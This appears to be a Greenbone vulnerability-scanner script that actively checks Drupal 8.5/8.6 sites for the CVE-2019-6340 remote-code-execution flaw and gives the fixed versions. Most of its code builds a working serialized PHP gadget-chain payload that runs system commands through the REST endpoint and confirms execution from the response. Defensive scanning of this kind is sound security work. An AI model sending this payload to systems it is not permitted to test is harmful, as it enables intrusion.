CPE = "cpe:/a:drupal:drupal";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.142038" );
	script_version( "2021-08-30T08:01:20+0000" );
	script_tag( name: "last_modification", value: "2021-08-30 08:01:20 +0000 (Mon, 30 Aug 2021)" );
	script_tag( name: "creation_date", value: "2019-02-25 12:44:16 +0700 (Mon, 25 Feb 2019)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-08-24 17:37:00 +0000 (Mon, 24 Aug 2020)" );
	script_cve_id( "CVE-2019-6340" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Drupal RCE Vulnerability (SA-CORE-2019-003) (Active Check)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "drupal_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "drupal/installed" );
	script_tag( name: "summary", value: "Some field types do not properly sanitize data from non-form sources. This
can lead to arbitrary PHP code execution in some cases." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "insight", value: "A site is only affected by this if one of the following conditions is met:

  - The site has the Drupal 8 core RESTful Web Services (rest) module enabled and allows PATCH or POST requests,
    or

  - the site has another web services module enabled, like JSON:API in Drupal 8, or Services or RESTful Web
    Services in Drupal 7." );
	script_tag( name: "affected", value: "Drupal 8.5.x and 8.6.x." );
	script_tag( name: "solution", value: "Update to version 8.5.11, 8.6.10 or later." );
	script_xref( name: "URL", value: "https://www.drupal.org/sa-core-2019-003" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/46452" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
cmds = exploit_commands();
url = dir + "/node/?_format=hal_json";
headers = make_array( "Content-Type", "application/hal+json" );
host = http_report_vuln_url( port: port, url: dir + "/rest/type/shortcut/default", url_only: TRUE );
for cmd in keys( cmds ) {
	data = "{\n" + "  \"link\": [\n" + "    {\n" + "      \"value\": \"link\",\n" + "      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"" + "\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods" + "\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"" + "\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler" + "\\\";s:2:\\\"" + cmds[cmd] + "\\\";s:30:\\\"" + "\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack" + "\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"" + "\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached" + "\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\n" + "    }\n" + "  ],\n" + "  \"_links\": {\n" + "    \"type\": {\n" + "      \"href\": \"" + host + "\"\n" + "    }\n" + "  }\n" + "}";
	req = http_post_put_req( port: port, url: url, data: data, add_headers: headers );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(ereg( pattern: cmd, string: res )){
		report = "It was possible to execute the \"" + cmds[cmd] + "\" command.\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

